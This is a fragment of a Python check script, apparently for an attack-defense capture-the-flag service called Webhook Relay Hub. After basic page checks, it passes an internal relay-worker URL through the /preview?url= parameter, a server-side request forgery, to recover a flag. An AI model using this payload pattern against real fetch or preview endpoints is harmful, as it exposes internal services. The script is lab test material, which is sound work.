...
BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:18131"
...
status, body = get("/")
expect(status == 200 and "Webhook Relay Hub" in body, "index page missing")
status, body = get("/feeds/demo")
expect(status == 200 and "relay-worker:9091" in body, "demo feed is unavailable")
flag = "flag{local_webhook_relay_hub_check}"
...
exploit_url = quote("http://relay-worker:9091/internal/replay?feed=demo", safe="")
status, body = with_retry(lambda: get("/preview?url=" + exploit_url))
expect(status == 200 and flag in body, "preview exploit path did not recover the current flag")
print("ok awd-webhook-relay-hub")
